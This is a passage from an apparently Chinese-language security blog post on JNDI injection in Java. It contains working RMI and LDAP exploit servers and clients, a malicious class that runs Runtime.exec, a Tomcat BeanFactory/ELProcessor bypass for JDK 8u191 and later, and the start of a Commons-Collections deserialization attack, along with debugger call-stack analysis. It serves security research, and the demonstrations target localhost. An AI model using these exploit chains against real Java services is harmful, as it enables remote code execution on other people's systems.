class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteObjectInterface)initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObject.sayHello(<span class="string">&quot;I&#x27;m Jasper you motherfucker.&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3 -m http.server 7777 起一个HTTP Server，目录里放编译后的恶意类，然后运行Server端，再运行Client端，成功执行代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695639364788-c2eaea04-2cc5-4169-8d35-3f7651c6dba9.png" alt="image.png"></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:163, NamingManager</span><br><span class="line">getObjectInstance:319, NamingManager</span><br><span class="line">decodeObject:464, RegistryContext</span><br><span class="line">lookup:124, RegistryContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:6, JNDIRMIClient</span><br></pre></td></tr></table></figure><p>在Client端的lookup处下断点，查看获取到Reference对象之后发生了什么<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695639679788-c1e7f22d-f70d-4c02-a7cc-4862feceb1e6.png" alt="image.png"><br>三层套娃调用lookup<br>initialContext#lookup<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695642897408-28cadd76-ed68-46b3-b4a5-ed8f8e4a7b6b.png" alt="image.png"><br>GenericURLContext#lookup<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695643124491-66a0b574-77cb-4460-a0cd-711a531744fe.png" alt="image.png"><br>RegistryContext#lookup，调了decodeObject对服务端传过来的对象解码<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695643522877-77ef4a2e-bb32-43e6-9e60-9664cdf2de04.png" alt="image.png"><br>RegistryContext#decodeObject，如果传过来的是引用对象，通过NamingManager#getObjectInstance获取引用所指向的对象。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695643908602-b57ae4c1-174a-4ae0-a35d-908b1b70c85f.png" alt="image.png"><br>NamingManager#getObjectInstance，首先通过<strong>getObjectFactoryFromReference</strong>获取对象指向的对象的工厂对象factory，再由factory#getObjectInstance获取到引用对象指向的真正对象，从工厂生产产品的思想。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695645696720-6aa2eb17-a74f-4cc9-9020-04dcd0d326ab.png" alt="image.png"><br>NamingManager#getObjectFactory，首先获取远程的工厂类，再实例化返回一个工厂对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695646521899-97c6e17e-3d85-47ce-9dac-fe5211876f1c.png" alt="image.png"><br>到这分析完毕，执行完这行就弹计算器了。</p><h2 id="JNDI操纵LDAP"><a href="#JNDI操纵LDAP" class="headerlink" title="JNDI操纵LDAP"></a>JNDI操纵LDAP</h2><p>适用JDK版本：&lt;8u191<br>测试JDK版本：8u121<br>在8u121之后，RegistryContext#decodeObject里加了trustURLCodebase，默认不允许远程加载Factory类<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695648681862-cf3083bd-9515-478f-8a2f-ae6dbd0d85cd.png" alt="image.png"><br>例如我们这里再执行上面的代码，提示要加载远程Factory，trustURLCodebase需要置为true。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695649049700-7f7a83f9-9928-4cf6-a1bb-6ee32f9afbe6.png" alt="image.png"><br>这个怎么绕过呢？其实很简单，他是在RegistryContext里加了限制条件，我们用别的SPI就好，比如LDAP。Oracle这里也挺怪的，只修了RMI服务的洞，没有把LDAP的一起修，留到了8u191才来修。</p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不用太注意LDAP服务端的实现代码，用专门的软件起一个LDAP服务也是一样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// codebase，加载恶意Calc类</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:7777/#Calc&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span> <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteObjectInterface)initialContext.lookup(<span class="string">&quot;ldap://localhost:1234/Calc&quot;</span>);</span><br><span class="line">        System.out.println(remoteObject.sayHello(<span class="string">&quot;I&#x27;m Jasper you motherfucker.&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3 -m http.server 7777 起一个HTTP Server，目录里放编译后的恶意Calc类，然后运行Server端，再运行Client端，成功执行代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695651368469-b64fcb4f-41b5-467e-8f49-dd62144dc18a.png" alt="image.png"></p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:163, NamingManager</span><br><span class="line">getObjectInstance:189, DirectoryManager</span><br><span class="line">c_lookup:1085, LdapCtx</span><br><span class="line">p_lookup:542, ComponentContext</span><br><span class="line">lookup:177, PartialCompositeContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:94, ldapURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:6, JNDILDAPClient</span><br></pre></td></tr></table></figure><p>主要漏洞点的逻辑和JNDI操纵RMI是完全一样的，关键点在NamingManager里，这里不再重复分析了。<br>看调用栈也能发现，使用LDAP的话根本不会走进RegistryContext，这也是为什么能绕过trustURLCodebase。</p><h2 id="JNDI-加载本地恶意类"><a href="#JNDI-加载本地恶意类" class="headerlink" title="JNDI 加载本地恶意类"></a>JNDI 加载本地恶意类</h2><p>适用JDK版本：≥8u191<br>测试JDK版本：8u191<br>在8u191版本里，Oracle直接在VersionHelper12.java这个文件里加了trustURLCodebase，这下所有SPI在loadClass的时候，都被禁止远程加载Factory了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695697231385-10a1c94c-189a-43a1-907c-bd5a445a5499.png" alt="image.png"><br>那么如何绕过呢？这里是选择利用本地组件。<br>之前分析过，在这里会新建工厂对象factory，并执行factory#getObjectInstance方法<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695697777191-4a509f73-ef0b-4a71-9ff4-88bb55705d35.png" alt="image.png"><br>那么如果客户端本地有一个Factory，它实现了ObjectFactory接口，并且重写的getObjectInstance方法里有可利用的gadgets，达到执行代码的效果，那么我们选择通过本地加载这个Factory，也能实现攻击。<br>Client本地可利用的Factory类的要求</p><ul><li>实现了ObjectFactory接口（上图的factory变量类型要求）</li><li>重写的getObjectInstance方法里有可利用的gadgets（实现攻击需要）</li></ul><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695698498930-84d11fe2-2ae3-406d-98d2-a0d2723d06a2.png" alt="image.png"><br>这里也不卖关子，利用的是Tomcat核心包里内置的BeanFactory类<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695698837123-4eea3d70-cb2a-490f-b0db-892aa4ab21d1.png" alt="image.png"><br>BeanFactory#getObjectInstance里有一个反射调用是可以利用的，我们完全可以在Server端构造出恶意命令。<br>这里不仔细分析参数构造了，感兴趣的师傅可以仔细研究研究。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695698956107-1f93031b-6cc9-4f90-831a-b12bc9f1d59d.png" alt="image.png"><br>注意：这种利用方式对SPI是什么没有要求的，RMI还是LDAP都是一样的，他们都会走到NamingManager里。</p><h3 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h3><p>这里以RMI服务为例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServerBypass8u191</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String) <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String) <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://localhost:1099/Tomcat8bypass&quot;</span>, resourceRef);</span><br><span class="line">        System.out.println(<span class="string">&quot;JNDIRMIServer start...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClientBypass8u191</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/Tomcat8bypass&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先加载Tomcat的依赖，再依次运行服务端和客户端，即可执行el表达式的代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695696578139-ba45c574-25b9-4a52-b5ea-1487d2e2bcbf.png" alt="image.png"></p><h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:163, NamingManager</span><br><span class="line">getObjectInstance:319, NamingManager</span><br><span class="line">decodeObject:464, RegistryContext</span><br><span class="line">lookup:124, RegistryContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:6, JNDIRMIClient</span><br></pre></td></tr></table></figure><p>前面流程和JNDIRMI完全一致，直接跳到NamingManager#getObjectFactoryFromReference<br>可以看到它从Client端本地获取到了Tomcat依赖里的BeanFactory，并创建factory实例对象返回。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695711233585-4bc9f1f9-75fa-4abc-8778-c947f61ce616.png" alt="image.png"><br>factory实例对象返回后，执行BeanFactory#getObjectInstance，这个函数是我们可以操纵执行EL表达式的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695711427802-8b77583e-0426-44ae-8543-fe0a8d4cdcd2.png" alt="image.png"><br>单步步过，成功执行代码<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695711511249-33a06b67-1812-4c5b-a624-95aa668c33d6.png" alt="image.png"><br>至此，JNDI加载恶意本地类的利用分析结束。</p><h2 id="JNDI操纵LDAP触发反序列化"><a href="#JNDI操纵LDAP触发反序列化" class="headerlink" title="JNDI操纵LDAP触发反序列化"></a>JNDI操纵LDAP触发反序列化</h2><p>适用JDK版本：≥8u191<br>测试JDK版本：8u191<br>同样是高版本的一种绕过手段，之前操纵LDAP是绑定的Reference对象，走的是类加载的路子。<br>实际上LDAP里有逻辑识别我们绑定的对象的类型，如果服务端绑一个序列化的字符串，就会有反序例化的点。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695720125409-df06e311-e27b-43f0-be0c-9ecce62376a8.png" alt="image.png"><br>走反序列化解析，可以看到调用了原生反序列化，显然是可以触发漏洞的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695729076498-0957f66c-73ac-4fb4-b548-fefa45cf20aa.png" alt="image.png"><br>这里我们用CC打，这就要求JNDIClient端有CC依赖，笔者用的CC6的链子，8u191低版本链子不适用。</p><h3 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        CC依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 